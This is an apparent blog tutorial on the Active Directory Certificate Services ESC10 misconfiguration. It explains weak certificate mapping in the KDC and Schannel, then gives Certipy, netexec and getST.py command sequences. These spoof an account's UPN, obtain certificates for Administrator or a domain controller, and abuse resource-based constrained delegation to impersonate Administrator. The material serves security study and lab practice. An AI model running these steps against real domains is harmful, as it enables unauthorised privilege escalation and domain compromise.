---
title: 'ADCS : ESC10'
date: 2026-06-04 11:59:19


categories:
  - Active Directory
  - Windows
  - Exploitation
  - ADCS

tags:
  - ESC10
  - Certipy
  - Netexec

cover: /img/esc10.png
top_img: /img/bg-img.jpg
description: Exploit ADCS ESC10.
---


# Certificate authentication mapping


When we authenticate using the `Certificate Authentication` method the Domain Controller (KDC) must answer a critical question :

> ➜ Which Active Directory account owns this certificate?

The process of associating a certificate with an Active Directory account is called `Certificate Mapping`.


Certificate mapping can occur in two different places:

> 1- The KDC if we use kerberos PKINIT authentication
> 
   2- Schannel if we use TLS client certificate authentication
   

#### Case 1 : Certificate + Kerberos

With this method, the certificate is used to request a Kerberos TGT through PKINIT.

```text
Certificate
     ↓
KDC asks: "Who owns this certificate?"
     ↓
Certificate Mapping
     ↓
TGT Issued
```

The important question becomes:

> How does the KDC answer this question : Who owns this certificate ?

The answer is controlled by the `StrongCertificateBindingEnforcement` registry value:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
```

This registry key defines how strictly the KDC maps certificates to Active Directory accounts.

> StrongCertificateBindingEnforcement = 0

```text
      Certificate
           ↓
 KDC reads the UPN
           ↓
 Finds the matching AD account
           ↓
       Issues a TGT
```

In this mode, the KDC relies on weak mapping methods such as the `UPN contained in the certificate` rather than enforcing `SID-based` validation.

Example:

```text
Certificate UPN : administrator@mirage.htb
Certificate SID : Attacker SID
```

The KDC searches Active Directory for :

```text
administrator@mirage.htb
```

Then maps the certificate to the matching account and as a result a TGT is issued for the Administrator account even though the SID embedded in the certificate belongs to the attacker.


> StrongCertificateBindingEnforcement = 1

In Compatibility Mode, the KDC first attempts SID-based certificate mapping and falls back to weaker methods such as UPN mapping if SID validation cannot be performed.


> StrongCertificateBindingEnforcement = 2

In Full Enforcement Mode, the KDC only performs SID-based certificate mapping and ignores weaker identifiers such as UPN, SAN, or Subject fields.




#### Case 2 : Certificate + Schannel (Secure Channel)

With this method, the certificate is used directly against a TLS-enabled service such as `LDAPS`, `HTTPS`, or `WinRM over HTTPS`.

```text
Certificate
     ↓
LDAPS / IIS / WinRM HTTPS
     ↓
Schannel asks: "Who owns this certificate?"
     ↓
Certificate Mapping
     ↓
Authenticated Session
```

The important question becomes:

> How does Schannel answer this question: Who owns this certificate?

The answer is controlled by the `CertificateMappingMethods` registry value:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods
```

This registry key defines how Schannel maps certificates to Active Directory accounts.

Schannel (Secure Channel) is Microsoft's SSL/TLS implementation used by services such as HTTPS, LDAPS, and other TLS-based applications, unlike Kerberos PKINIT this authentication flow does not issue a TGT instead the user receives an authenticated session to the target service.

> CertificateMappingMethods = 0x4

```text
      Certificate
           ↓
 Schannel reads Subject
           ↓
 Finds the matching AD account
           ↓
 Creates an authenticated session
```

In this mode, Schannel relies on weak mapping methods such as the certificate Subject rather than enforcing strong SID-based validation.

Example:

```text
Certificate Subject : CN=Administrator
Certificate SID     : Attacker SID
```

Schannel searches Active Directory for:

```text
CN=Administrator
```

Then maps the certificate to the matching account. As a result, an authenticated session may be established as the Administrator account even though the certificate SID belongs to the attacker.



# Esc10


> ESC10 is an AD CS misconfiguration that occurs when weak certificate mapping is used. Instead of mapping a certificate to an account using the `SID` stored in the `szOID_NTDS_CA_SECURITY_EXT` extension, the system relies on weaker identifiers such as the certificate's `UPN` or `Subject` that are embedded in the certificate, this may allow an attacker to obtain a certificate that maps to another Active Directory account and authenticate as that user.

### Case 1 : Kerberos / PKINIT mapping

##### Requirements

> - Weak Kerberos mapping : `StrongCertificateBindingEnforcement = 0`
> 
> - Client authentication template : At least one enabled certificate template must allow client authentication, such as the built-in `User` template.
> 
> - Write access over another account : We need at least `GenericWrite` permissions over another user account.


➜ After Microsoft's 2023 certificate mapping hardening updates, ESC10 Case 1 became significantly harder to exploit, systems that enforce SID-based certificate mapping are generally not vulnerable, while unpatched systems or environments that still allow weak mapping may remain exploitable.

##### Enumeration

> Find AD CS 

```bash
➜ netexec ldap dc-ip -u user -p pwd -M adcs
```

> Check the Kerberos certificate mapping configuration (`StrongCertificateBindingEnforcement`)

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement

➜ The value should be 0
``` 

> Enumerate Certificate Authorities and templates

```bash
➜ certipy find -u user -p pwd -dc-ip ip -stdout
```

> Identify vulnerable certificate configurations

```bash
➜ certipy find -u user -p pwd -dc-ip ip -vulnerable -stdout
```


##### Exploitation


>- user-b has one of those permissions ( GenericAll / GenericWrite / WriteProperty / WriteDACL / Owner ) over user-a
>
>- user-a : is the account that will be used to request `Administrator Certificate` 



> Change user-a's UPN to the target identity


```
➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn administrator@lab.local
```

> Request a certificate using an authentication-enabled template

```
➜ certipy req -u 'user-a@lab.local' -p pwd -target dc.lab.local -ca CA-Name -template User
```

> Restore user-a's original UPN

```bash
➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn user-a@lab.local
```

> Authenticate with the certificate

```bash
➜ certipy auth -pfx user-a.pfx -domain lab.local -dc-ip dc-ip
```




### Case 2 : Schannel Mapping

##### Requirements

> - Weak Schannel mapping: `CertificateMappingMethods = 0x4`
> - Client authentication template: At least one enabled certificate template must allow client authentication.
> - Write access over another account: We need at least `GenericWrite` permissions over another user account.

##### Enumeration

> Find AD CS

```
➜ netexec ldap dc-ip -u user -p pwd -M adcs
```

> Check the Schannel certificate mapping configuration (`CertificateMappingMethods`)

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods

➜ The value should be 0x4
```

> Enumerate Certificate Authorities and templates

```
➜ certipy find -u user -p pwd -dc-ip ip -stdout
```

> Identify vulnerable certificate configurations

```
➜ certipy find -u user -p pwd -dc-ip ip -vulnerable -stdout
```

> ➜ Certipy does not directly detect ESC10 by querying the Schannel `CertificateMappingMethods` registry key on Domain Controllers or other target servers, as this typically requires privileged access (like local administrator rights) to those servers’ registries.

##### Exploitation

> - user-b has one of those permissions (`GenericAll` / `GenericWrite` / `WriteProperty` / `WriteDACL` / `Owner`) over user-a
> - user-a is the account that will be used to request the target certificate

> Change user-a's UPN to the target identity

```
➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn DC-Name$
```

> Request a certificate using an authentication-enabled template

```
➜ certipy req -u 'user-a@lab.local' -p pwd -target dc.lab.local -ca CA-Name -template User
```

> Restore user-a's original UPN

```
➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn user-a@lab.local
```


> Finally, because this misconfiguration affects Schannel certificate mapping rather than Kerberos PKINIT mapping, the certificate cannot be used to obtain a Kerberos TGT as in ESC10 Case 1 instead authentication must be performed through a Schannel-enabled service such as LDAPS, for this purpose Certipy provides the `-ldap-shell` option which authenticates using the certificate via Schannel and opens an authenticated LDAP session. Although this session does not provide code execution, it allows us to modify Active Directory objects and perform attacks such as configuring  (RBCD).



> Creating a new computer account

```
➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip ip -ldap-shell


# add_computer <machine-name> <password>
```

> Configure Rbcd 

```bash
➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell

# set_rbcd <TARGET_MACHINE> <CONTROLLED_MACHINE>
```

> Abusing RBCD to Impersonate the Administrator

```bash
getST.py -spn cifs/DC.LAB.LOCAL -impersonate Administrator -dc-ip ip lab.local/'machine-name$':password

[*] Saving ticket in Administrator.ccache
```